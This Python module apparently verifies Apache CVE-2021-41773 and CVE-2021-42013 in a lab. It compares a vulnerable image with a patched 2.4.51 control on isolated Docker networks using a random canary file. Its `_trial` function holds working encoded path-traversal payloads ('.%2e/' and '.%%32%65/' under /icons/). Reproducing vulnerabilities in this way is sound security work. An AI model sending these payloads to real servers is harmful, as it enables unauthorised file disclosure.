"""Lab-only Apache CVE-2021-41773 / CVE-2021-42013 differential file-read oracle.

This verifier never sends requests outside a private Docker network, executes no
remote commands, and only reads a random file that it creates in each target.
The control is HTTPD 2.4.51 plus the *vulnerable image's Apache configuration*.
If the fixed control cannot start or the configuration cannot be confirmed,
there is deliberately no positive CVE verdict.
"""
from __future__ import annotations

import hashlib
import json
import re
import secrets
import tempfile
import time
import uuid
from pathlib import Path

from .core import Executor, TaskError, budget_seconds, json_write, sha256_file
from .verify import CURL_IMAGE, assert_archive_tag
from .service_check import _http

FIXED_BASE = 'httpd:2.4.51'
TARGET_VERSION = '2.4.49'
FIXED_VERSION = '2.4.51'


def _read_json(path):
    try:
        return json.loads(Path(path).read_text(encoding='utf-8'))
    except (ValueError, OSError) as e:
        raise TaskError('CASE_JSON_ERROR', f'{path}: {e}') from e


def _image_available(runner, image, deadline, allow_pull=False):
    p = runner.run(['docker', 'image', 'inspect', image],
                   timeout=budget_seconds(deadline, 15), check=False)
    if p.returncode == 0:
        return
    if not allow_pull:
        raise TaskError('IMAGE_MISSING', f'{image}; retry with --allow-pull')
    runner.run(['docker', 'pull', image], timeout=budget_seconds(deadline, 180))


def _extract_config(runner, image, root, deadline):
    """Get the configuration from exactly the exported vulnerable image."""
    name = 't3cfg-' + uuid.uuid4().hex[:10]
    created = False
    try:
        runner.run(['docker', 'create', '--name', name, image],
                   timeout=budget_seconds(deadline, 30))
        created = True
        conf = root / 'conf'
        conf.mkdir()
        runner.run(['docker', 'cp', name + ':/usr/local/apache2/conf/.', str(conf)],
                   timeout=budget_seconds(deadline, 30))
        main = conf / 'httpd.conf'
        alias = conf / 'extra' / 'httpd-autoindex.conf'
        if not main.is_file() or not alias.is_file():
            raise TaskError('APACHE_CONFIG_INCOMPLETE', 'httpd.conf or autoindex include missing')
        content = main.read_text(encoding='utf-8', errors='replace')
        if not re.search(r'^\s*Include\s+conf/extra/httpd-autoindex\.conf\s*$', content, re.M):
            raise TaskError('APACHE_ALIAS_NOT_ENABLED', 'Expected same /icons/ alias configuration')
        if not re.search(r'(?m)^\s*Alias\s+/icons/\s+', alias.read_text(errors='replace')):
            raise TaskError('APACHE_ALIAS_NOT_ENABLED', 'Expected /icons/ Alias entry')
        return {
            'httpd_conf_sha256': sha256_file(main),
            'autoindex_conf_sha256': sha256_file(alias),
        }
    finally:
        if created:
            runner.run(['docker', 'rm', '-f', name],
                       timeout=budget_seconds(deadline, 20), check=False)


def _build_fixed(runner, root, name, deadline):
    # No remote package installs and no modifications to the vulnerable version.
    (root / 'Dockerfile').write_text(
        'FROM httpd:2.4.51\n'
        'COPY conf/ /usr/local/apache2/conf/\n', encoding='utf-8')
    runner.run(['docker', 'build', '--pull=false', '--network', 'none',
                '-t', name, str(root)], timeout=budget_seconds(deadline, 120))
    # Apache itself must accept the copied configuration before comparison.
    p = runner.run(['docker', 'run', '--rm', '--network', 'none',
                    '--entrypoint', 'httpd', name, '-t'],
                   timeout=budget_seconds(deadline, 25))
    return {'config_test': 'PASSED', 'config_test_output': p.stderr[-250:] if hasattr(p, 'stderr') else ''}


def _confirm_control_config(runner, image, root, expected, deadline):
    """Read back the control image's two critical configs; reject drift."""
    name = 't3fixedconf-' + uuid.uuid4().hex[:10]
    created = False
    try:
        runner.run(['docker','create','--name',name,image],
                   timeout=budget_seconds(deadline,25))
        created = True
        pairs = [
            ('httpd.conf','httpd_conf_sha256'),
            ('extra/httpd-autoindex.conf','autoindex_conf_sha256'),
        ]
        for relative, field in pairs:
            dest = root / ('control-' + relative.replace('/','-'))
            runner.run(['docker','cp',
                        name + ':/usr/local/apache2/conf/' + relative, str(dest)],
                       timeout=budget_seconds(deadline,20))
            if sha256_file(dest) != expected[field]:
                raise TaskError('PATCHED_CONFIG_DRIFT', relative)
        return 'CRITICAL_CONFIG_BYTES_MATCHED'
    finally:
        if created:
            try:
                runner.run(['docker','rm','-f',name],timeout=20,check=False)
            except TaskError:
                pass


def _version(runner, cname, deadline):
    p = runner.run(['docker', 'exec', cname, 'httpd', '-v'],
                   timeout=budget_seconds(deadline, 12))
    m = re.search(r'Apache/(\d+\.\d+\.\d+)(?!\d)', p.stdout)
    if not m:
        raise TaskError('APACHE_VERSION_UNKNOWN', p.stdout[:250])
    return m.group(1)


def _trial(runner, image, expected, marker, filename, deadline, *, attack_segment='.%2e'):
    """Start one target, perform readiness/version/positive/negative tests, cleanup."""
    suffix = uuid.uuid4().hex[:10]
    network = 't3apnet-' + suffix
    cname = 't3apache-' + suffix
    network_created = False
    started = False
    result = {'image': image, 'expected_version': expected,
              'network_isolation': 'internal_only_sidecar',
              'host_ports_published': False}
    try:
        runner.run(['docker', 'network', 'create', '--internal', network],
                   timeout=budget_seconds(deadline, 25))
        network_created = True
        runner.run(['docker', 'run', '-d', '--name', cname, '--network', network,
                    '--network-alias', 'target', '--cap-drop', 'ALL',
                    '--security-opt', 'no-new-privileges', '--memory', '512m',
                    '--pids-limit', '160', image],
                   timeout=budget_seconds(deadline, 45))
        started = True
        last = ''
        for attempt in range(1, 31):
            try:
                p = _http(runner, network, 'target', 80, '/', deadline)
                if p['http'] == 200 and p['body'].strip():
                    result['readiness_attempts'] = attempt
                    break
                last = f'HTTP={p["http"]}'
            except TaskError as exc:
                last = f'{exc.code}: {str(exc)[:180]}'
            if deadline - time.monotonic() <= 18:
                raise TaskError('APACHE_NOT_READY', last)
            time.sleep(2)
        else:
            raise TaskError('APACHE_NOT_READY', last)
        ver = _version(runner, cname, deadline)
        result['health_version'] = ver
        if ver != expected:
            raise TaskError('APACHE_VERSION_MISMATCH', f'expected={expected} actual={ver}')
        path = '/tmp/' + filename
        runner.run(['docker', 'exec', '--user', '0', cname, 'sh', '-c',
                    'umask 022; printf %s "$1" > "$2"; chmod 0644 "$2"',
                    't3', marker, path], timeout=budget_seconds(deadline, 15))
        normal = _http(runner, network, 'target', 80, '/icons/' + filename, deadline)
        # Controlled local /tmp marker only; encoded traversal is never directed
        # outside the single-use Docker --internal network.
        if attack_segment not in ('.%2e', '.%%32%65'):
            raise TaskError('UNSUPPORTED_APACHE_CANARY', attack_segment)
        positives = [
            _http(runner, network, 'target', 80,
                  '/icons/' + (attack_segment + '/') * 4 + 'tmp/' + filename, deadline),
            _http(runner, network, 'target', 80,
                  '/icons/' + (attack_segment + '/') * 5 + 'tmp/' + filename, deadline),
        ]
        result.update({
            'negative_http': normal['http'],
            'negative_exact': normal['body'] == marker,
            'positive_http': [x['http'] for x in positives],
            'positive_exact': any(x['http'] == 200 and x['body'] == marker for x in positives),
            'positive_sha256': [hashlib.sha256(x['body'].encode()).hexdigest() for x in positives],
            'negative_sha256': hashlib.sha256(normal['body'].encode()).hexdigest(),
            'canary_sha256': hashlib.sha256(marker.encode()).hexdigest(),
            'canary_filename': filename,
        })
        return result
    except TaskError as e:
        result['error_code'] = e.code
        result['error'] = str(e)[:1000]
        if started:
            p = runner.run(['docker', 'logs', '--tail', '35', cname], timeout=12, check=False)
            result['logs_tail'] = (p.stdout + '\n' + p.stderr)[-1500:]
        return result
    finally:
        try:
            if started:
                p = runner.run(['docker', 'rm', '-f', cname], timeout=20, check=False)
                result['container_cleanup'] = 'OK' if p.returncode == 0 else 'FAILED'
            if network_created:
                p = runner.run(['docker', 'network', 'rm', network], timeout=20, check=False)
                result['network_cleanup'] = 'OK' if p.returncode == 0 else 'FAILED'
        except (TaskError, OSError) as exc:
            result['cleanup_error'] = str(exc)[:200]


def verify_apache_case(case_dir, *, runner=None, allow_pull=False, budget=360,
                       cve='CVE-2021-41773'):
    """Use the original Apache config and a patched 2.4.51 binary as control."""
    case = Path(case_dir).expanduser().resolve()
    runner = runner or Executor()
    specs = {
        'CVE-2021-41773': {'target_version': '2.4.49', 'attack_segment': '.%2e', 'folder': 'apache'},
        'CVE-2021-42013': {'target_version': '2.4.50', 'attack_segment': '.%%32%65', 'folder': 'apache42013'},
    }
    if cve not in specs:
        raise ValueError('Unsupported Apache differential CVE: ' + str(cve))
    spec = specs[cve]
    output = case / 'proof' / spec['folder'] / 'apache_proof.json'
    report = {'cve': cve, 'status': 'PROOF_FAILED',
              'vulnerability_verified': False, 'case': str(case),
              'fixed_base': FIXED_BASE, 'checks': []}
    fixed_tag = 't3apachefixed:' + uuid.uuid4().hex[:12]
    built = False
    deadline = time.monotonic() + budget
    try:
        if not 90 <= budget <= 1800:
            raise TaskError('BAD_BUDGET', 'Use a budget between 90 and 1800 seconds')
        source = _read_json(case / 'result.json')
        if source.get('cve') != cve:
            raise TaskError('WRONG_CVE', f"case={source.get('cve')}")
        if source.get('status') != 'ENVIRONMENT_EXPORTED_NOT_CVE_PROOF':
            raise TaskError('CASE_NOT_EXPORTED', 'Real exported case required')
        images = source.get('images')
        if not isinstance(images, list) or len(images) != 1:
            raise TaskError('UNEXPECTED_IMAGE_COUNT', repr(images))
        artifact = Path(source['artifact'])
        if not artifact.is_file() or sha256_file(artifact) != source.get('archive_sha256'):
            raise TaskError('ARTIFACT_MISMATCH', 'Original saved Docker tar is absent/modified')
        candidate = images[0]
        report['vulnerable_image'] = candidate
        report['identity'] = assert_archive_tag(artifact, candidate, runner, allow_load=False)
        report['checks'].append('ORIGINAL_ARCHIVE_CONFIG_MATCHED')
        _image_available(runner, CURL_IMAGE, deadline, allow_pull)
        _image_available(runner, FIXED_BASE, deadline, allow_pull)
        with tempfile.TemporaryDirectory(prefix='t3apache-control-') as td:
            root = Path(td)
            conf_hash = _extract_config(runner, candidate, root, deadline)
            report['configuration'] = conf_hash
            report['checks'].append('ORIGINAL_APACHE_CONFIG_EXTRACTED')
            # A patched binary runs with the original vulnerable image's config.
            built = True
            report['control_build'] = _build_fixed(runner, root, fixed_tag, deadline)
            report['checks'].append('PATCHED_BINARY_ORIGINAL_CONFIG_SYNTAX_VALID')
            report['control_configuration_check'] = _confirm_control_config(
                runner, fixed_tag, root, conf_hash, deadline)
            report['checks'].append('CONTROL_CRITICAL_CONFIG_BYTES_MATCHED')
            marker = 'T3_NON_SECRET_CANARY_' + secrets.token_hex(24)
            filename = 't3_' + secrets.token_hex(12) + '.txt'
            if cve == 'CVE-2021-41773':
                vuln = _trial(runner, candidate, TARGET_VERSION, marker, filename, deadline)
            else:
                vuln = _trial(runner, candidate, spec['target_version'], marker,
                              filename, deadline, attack_segment=spec['attack_segment'])
            report['vulnerable_trial'] = vuln
            if vuln.get('error_code'):
                raise TaskError('VULNERABLE_TRIAL_FAILED', vuln['error'])
            if cve == 'CVE-2021-41773':
                patched = _trial(runner, fixed_tag, FIXED_VERSION, marker, filename, deadline)
            else:
                patched = _trial(runner, fixed_tag, FIXED_VERSION, marker,
                                 filename, deadline, attack_segment=spec['attack_segment'])
            report['fixed_trial'] = patched
            if patched.get('error_code'):
                raise TaskError('PATCHED_TRIAL_FAILED', patched['error'])
            report['checks'].append('TWO_RUNNING_APACHE_VERSIONS_CONFIRMED')
            report['checks'].append('SAME_REQUESTS_AND_RANDOM_CANARY_COMPARED')
            passed = (
                vuln['health_version'] == spec['target_version'] and
                patched['health_version'] == FIXED_VERSION and
                vuln['positive_exact'] and
                not vuln['negative_exact'] and
                not patched['positive_exact'] and
                not patched['negative_exact']
            )
            report['status'] = 'BEHAVIOR_VERIFIED' if passed else 'NOT_REPRODUCED'
            report['vulnerability_verified'] = bool(passed)
    except (TaskError, ValueError, KeyError, OSError) as e:
        report['error_code'] = getattr(e, 'code', 'APACHE_PROOF_ERROR')
        report['error'] = str(e)[:1200]
    finally:
        if built:
            try:
                p = runner.run(['docker', 'image', 'rm', '-f', fixed_tag], timeout=40, check=False)
                report['temporary_fixed_image_cleanup'] = 'OK' if p.returncode == 0 else 'FAILED'
            except (TaskError, OSError) as e:
                report['temporary_fixed_image_cleanup'] = f'FAILED:{str(e)[:140]}'
        json_write(output, report)
    return report
